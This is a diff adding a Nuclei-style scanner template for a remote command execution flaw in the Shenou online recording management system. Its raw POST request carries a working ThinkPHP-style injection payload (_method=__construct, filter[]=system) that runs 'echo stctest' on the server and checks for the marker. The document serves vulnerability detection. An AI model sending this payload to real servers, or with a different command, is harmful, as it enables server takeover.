@@ -1,0 +1,30 @@
+id: sozxly-index-rce
+
+info:
+  name: sozxly-index-rce
+  author: xiaokp7
+  severity: critical
+  description: 瓯通信设备有限公司在线录音管理系统系统是一款全面的企业管理软件，涵盖多个领域，助力企业实现信息化管理和业务优化。申瓯通信设备有限公司在线录音管理系统index存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /callcenter/public/index.php/index.php?s=index/index/index HTTP/1.1
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+    Content-type: application/x-www-form-urlencoded
+    Cache-Control: no-cache
+    Pragma: no-cache
+    Host: {{Hostname}}
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+    Connection: close
+    Content-Length: 62
+
+    s=echo stctest&_method=__construct&method=POST&filter[]=system
+
+  matchers:
+    - type: dsl
+      dsl:
+        - 'contains_all(body,"stctest")'
+
+# Generated From WebFuzzer on 2024-06-19 14:29:56
